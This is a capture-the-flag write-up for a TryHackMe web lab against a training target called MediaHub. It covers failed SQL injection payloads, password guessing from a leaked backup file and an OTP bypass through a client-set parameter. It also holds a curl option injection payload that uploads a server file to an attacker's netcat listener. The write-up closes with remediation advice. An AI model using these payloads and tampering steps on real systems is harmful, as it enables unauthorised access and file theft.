@@ -1,0 +1,360 @@
+================================================================================
+ MediaHub - "Interceptor" Challenge Writeup
+ Target : http://10.48.154.108
+ Category : Web Application Security | Authentication Bypass | SSRF / Curl
+            Option Injection
+ Difficulty : Easy
+ Date : 2026-08-10
+================================================================================
+
+TABLE OF CONTENTS
+  1.  Overview / Scenario
+  2.  Reconnaissance & Enumeration
+  3.  SQL Injection Testing (Negative Result)
+  4.  Source Code Disclosure (login.php.bak)
+  5.  Credential Discovery
+  6.  Authentication (Admin Login)
+  7.  OTP Verification Bypass (Interceptor Tampering)
+  8.  Admin Access & Flag 1
+  9.  File Import Abuse (SSRF / Curl Option Injection) & Flag 2
+ 10. Key Findings
+ 11. Lessons Learned / Remediation
+ 12. Tools Used
+ 13. References
+
+--------------------------------------------------------------------------------
+1. OVERVIEW / SCENARIO
+--------------------------------------------------------------------------------
+
+MediaHub is an internal media portal used by journalists and editors to manage
+content and publishing. The application looks like a normal portal protected by
+a login and a two-factor (OTP) verification system.
+
+However, the real story lies in how the application communicates with its
+backend APIs. By intercepting the traffic between the browser and the server
+and making small, well-chosen changes to the requests, it is possible to:
+
+    - Bypass authentication entirely,
+    - Bypass the OTP verification, and
+    - Abuse a server-side feed importer to exfiltrate local files.
+
+The intended approach is proxy-based request tampering (e.g. Burp Suite), not
+SQL injection.
+
+--------------------------------------------------------------------------------
+2. RECONNAISSANCE & ENUMERATION
+--------------------------------------------------------------------------------
+
+Target IP  : 10.48.154.108
+Web server : Apache/2.4.41 (Ubuntu)
+Backend    : PHP (PHPSESSID cookies issued)
+Title      : MediaHub
+
+2.1 Initial probing of the login page
+    GET /login.php
+    - Returns the MediaHub login page.
+    - The login form is an AJAX form that POSTs to api_login.php.
+
+    Observed form (HTML):
+        <form id="loginForm">
+          <input name="email" placeholder="Email" required>
+          <input name="password" type="password" required>
+        </form>
+    JavaScript:
+        fetch("api_login.php", { method: "POST", body: payload });
+
+2.2 Endpoint enumeration
+    POST /api_login.php
+        body: email=test@test.com&password=test123
+        -> {"ok":false,"error":"Invalid credentials."}
+
+    The following pages exist but are only static fallback pages / redirects:
+        /dashboard.php          (302 -> login.php, unauthenticated)
+        /search.php             (302 -> login.php, unauthenticated)
+        /videos.php, /admin.php (static "Welcome to MediaHub")
+        /profile.php            (static)
+    Guessed "api_*.php" endpoints return the same static fallback HTML.
+
+--------------------------------------------------------------------------------
+3. SQL INJECTION TESTING (NEGATIVE RESULT)
+--------------------------------------------------------------------------------
+
+The login endpoint api_login.php was tested extensively for SQL injection.
+All attempts failed, indicating the query is parameterized / protected.
+
+3.1 Manual tests (both email and password parameters)
+    Auth bypass:
+        email=test@test.com' OR '1'='1            -> Invalid credentials.
+        email=' OR 1=1-- -                        -> Invalid credentials.
+    Boolean-based blind:
+        email=test@test.com' AND '1'='1           -> Invalid credentials.
+        email=test@test.com' AND '1'='2           -> Invalid credentials.
+        (no differential behaviour between true/false)
+    Time-based:
+        password=x' OR SLEEP(5)-- -               -> no delay observed
+    Union:
+        email=test' UNION SELECT 1,2-- -          -> Invalid credentials.
+    Error-based:
+        email=test' AND 1=CAST((SELECT version()) AS int)-- -
+                                                  -> Invalid credentials.
+    Wildcard:
+        email=*                                   -> Invalid credentials.
+
+3.2 Automated testing with sqlmap
+    sqlmap -u "http://10.48.154.108/api_login.php" \
+           --data "email=test@test.com&password=test123" \
+           -p email --batch --level 3 --risk 2
+    Result: POST parameter 'email' does not seem to be injectable.
+
+    sqlmap ... -p password ...
+    Result: POST parameter 'password' does not seem to be injectable.
+            (boolean, error, time, stacked, union all negative)
+
+CONCLUSION: The login endpoint is NOT SQL injectable. The attack surface is
+elsewhere (source disclosure + client-side auth + feed importer).
+
+--------------------------------------------------------------------------------
+4. SOURCE CODE DISCLOSURE (login.php.bak)
+--------------------------------------------------------------------------------
+
+Directory/file fuzzing with the ".bak" extension revealed a leftover backup
+copy of the login page source code:
+
+    GET /login.php.bak
+    HTTP 200  (source code disclosed)
+
+Content:
+--------------------------------------------------------------------------------
+<?php
+include "header.php";
+
+/*
+|--------------------------------------------------------------------------
+| Developer Note (temporary)
+|--------------------------------------------------------------------------
+| Admin test account for staging environment
+| Email: admin@mediahub.thm
+|
+| Password policy reminder:
+| Admin password follows company format:
+| MediaHub + any year
+|
+| TODO: remove before production deployment
+*/
+?>
+--------------------------------------------------------------------------------
+
+This single file disclosed:
+    - The existence of an admin test account.
+    - The admin email address  : admin@mediahub.thm
+    - The password policy      : "MediaHub" + any year
+
+--------------------------------------------------------------------------------
+5. CREDENTIAL DISCOVERY
+--------------------------------------------------------------------------------
+
+Using the disclosed password pattern "MediaHub + any year", a small password
+list was generated and tested manually (the app applies rate limiting, so a
+slow manual approach is required).
+
+    for y in $(seq 2023 2027); do
+        curl -s -X POST http://10.48.154.108/api_login.php \
+             -d "email=admin@mediahub.thm&password=MediaHub$y"
+    done
+
+Results:
+    MediaHub2025 -> {"ok":false,"error":"Invalid credentials."}
+    MediaHub2026 -> {"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
+    MediaHub2024 -> {"ok":false,"error":"Invalid credentials."}
+    MediaHub2023 -> {"ok":false,"error":"Invalid credentials."}
+    MediaHub2027 -> {"ok":false,"error":"Invalid credentials."}
+
+VALID CREDENTIALS:
+    Username : admin@mediahub.thm
+    Password : MediaHub2026
+
+--------------------------------------------------------------------------------
+6. AUTHENTICATION (ADMIN LOGIN)
+--------------------------------------------------------------------------------
+
+    POST /api_login.php
+    Content-Type: application/x-www-form-urlencoded
+
+    email=admin@mediahub.thm&password=MediaHub2026
+
+    Response:
+    {"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
+
+    The application now requires an OTP before granting administrative access.
+    A PHPSESSID cookie was issued to maintain the session.
+
+--------------------------------------------------------------------------------
+7. OTP VERIFICATION BYPASS (INTERCEPTOR TAMPERING)
+--------------------------------------------------------------------------------
+
+After login, the client is taken to /otp.php which submits a 6-digit OTP to
+verify_otp.php.
+
+    GET /otp.php
+    - Shows "Two Factor Verification" form:
+        <form id="otpForm">
+          <input name="otp" maxlength="6" pattern="\d{6}" required>
+        </form>
+    - JavaScript posts to verify_otp.php.
+
+    POST /verify_otp.php
+        body: otp=000000
+        -> {"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
+
+The key weakness: the server trusts a CLIENT-CONTROLLED parameter called
+"is_verified" to decide the outcome of the OTP check. By intercepting the
+request with a proxy (Burp Suite / curl) and adding this parameter, the OTP
+check can be bypassed without knowing the real code.
+
+    POST /verify_otp.php
+        body: otp=000000&is_verified=False
+        -> {"ok":true,"message":"OTP verified. Redirecting..."}
+
+    (Changing is_verified from the client bypassed the entire OTP process.)
+
+This is a classic "broken server-side authentication validation" bug - the
+security decision is delegated to data supplied by the client instead of being
+verified on the server.
+
+--------------------------------------------------------------------------------
+8. ADMIN ACCESS & FLAG 1
+--------------------------------------------------------------------------------
+
+With the OTP step bypassed, the session is now fully authenticated as admin.
+
+    GET /dashboard.php  -> 200 OK (no redirect)
+
+The dashboard reveals:
+
+    Flag: THM{ADMIN_ACCESS_USING_BURP}
+
+    User shown     : admin@mediahub.thm
+    Role           : admin
+    Features       :
+        - Profile picture upload (upload_profile.php)
+        - "Import Feed" (AJAX -> import_feed_api.php)
+
+    FLAG 1 : THM{ADMIN_ACCESS_USING_BURP}
+
+--------------------------------------------------------------------------------
+9. FILE IMPORT ABUSE (SSRF / CURL OPTION INJECTION) & FLAG 2
+--------------------------------------------------------------------------------
+
+9.1 The Import Feed feature
+
+The admin dashboard contains an "Import Feed" feature that accepts a
+feed URL. The JavaScript builds a POST request to import_feed_api.php:
+
+    POST /import_feed_api.php
+        body: url=<feed_url>
+
+The server-side implementation executes the URL using curl and returns the
+raw curl output to the browser.
+
+    POST /import_feed_api.php
+        body: url=http://example.com/
+        -> {"ok":false,"error":"Internet not connected",
+            "cmd_output":"  % Total    % Received ... "}
+
+The "cmd_output" field contains the raw terminal output of the curl command,
+proving that the user-supplied URL is interpolated into a server-side curl
+command.
+
+9.2 Injecting curl options
+
+The input is only filtered for ';' '&' and '|' characters, but curl options
+can still be injected using spaces. Because the importer echoes curl output
+and follows the provided arguments, we can tell curl to upload a local file
+(-F file=@path) to an attacker-controlled listener.
+
+Payload sent to import_feed_api.php:
+
+    url=http://mediahub.com/ -F file=@/var/www/user.txt http://192.168.164.33:4444
+
+    - http://mediahub.com/            : bogus first URL (curl option injection
+                                        trick so the command parses correctly)
+    - -F file=@/var/www/user.txt      : curl uploads the server file user.txt
+    - http://192.168.164.33:4444      : attacker listener (attacker machine)
+
+9.3 Capturing the file
+
+An attacker listener was started on the attacking machine:
+
+    nc -lvnp 4444
+
+The vulnerable server made a connection back and uploaded the file:
+
+    POST / HTTP/1.1
+    Host: 192.168.164.33:4444
+    User-Agent: curl/7.68.0
+    Content-Type: multipart/form-data; boundary=---...
+    Content-Length: 217
+
+    Content-Disposition: form-data; name="file"; filename="user.txt"
+    Content-Type: text/plain
+
+    THM{SYSTEM_PWNED_SUCCESSFULLY}
+
+    FLAG 2 : THM{SYSTEM_PWNED_SUCCESSFULLY}
+
+    NOTE: This behaviour is effectively a Local File Disclosure / SSRF with
+    file exfiltration. The same technique could leak /etc/passwd, config files,
+    credentials, SSH keys, etc.
+
+--------------------------------------------------------------------------------
+10. KEY FINDINGS
+--------------------------------------------------------------------------------
+
+    1. Exposed backup file     : /login.php.bak disclosed developer notes.
+    2. Information disclosure  : Admin email + password policy leaked.
+    3. Predictable credentials : admin@mediahub.thm / MediaHub2026.
+    4. Broken OTP control      : Client-supplied is_verified flag trusted.
+    5. Admin access            : Flag 1 THM{ADMIN_ACCESS_USING_BURP}.
+    6. Unsafe feed importer    : Server-side curl option injection (SSRF).
+    7. File disclosure         : Exfiltrated /var/www/user.txt.
+    8. System compromise       : Flag 2 THM{SYSTEM_PWNED_SUCCESSFULLY}.
+
+--------------------------------------------------------------------------------
+11. LESSONS LEARNED / REMEDIATION
+--------------------------------------------------------------------------------
+
+    - Remove all backup/development files (login.php.bak, .git, .tar, .zip)
+      from production.
+    - Never embed credentials or password policies in source comments.
+    - Enforce strong, unpredictable password policies; do not use
+      "company format" passwords (MediaHub<year>).
+    - Always validate authentication/OTP status on the server side. Never
+      accept client-controlled parameters such as is_verified as a security
+      decision.
+    - Never pass user input directly to shell commands (curl <url>). Use a
+      proper URL-parsing library and validate the scheme/host. If curl is
+      required, use --url with explicit escaping and deny options injection.
+    - Apply the principle of least privilege; the feed importer should not be
+      able to read arbitrary files from the server.
+
+--------------------------------------------------------------------------------
+12. TOOLS USED
+--------------------------------------------------------------------------------
+
+    - curl (manual request crafting and interception)
+    - sqlmap (automated SQLi testing - negative result)
+    - netcat (nc -lvnp 4444) for capturing the exfiltrated file
+    - Burp Suite (equivalent manual proxy tampering workflow)
+
+--------------------------------------------------------------------------------
+13. REFERENCES
+--------------------------------------------------------------------------------
+
+    - TryHackMe "Interceptor" challenge (MediaHub)
+    - OWASP: Improper Access Control / Broken Authentication
+    - OWASP: SSRF (Server-Side Request Forgery)
+    - OWASP: Security Misconfiguration (exposed backup files)
+
+================================================================================
+END OF WRITEUP
+================================================================================
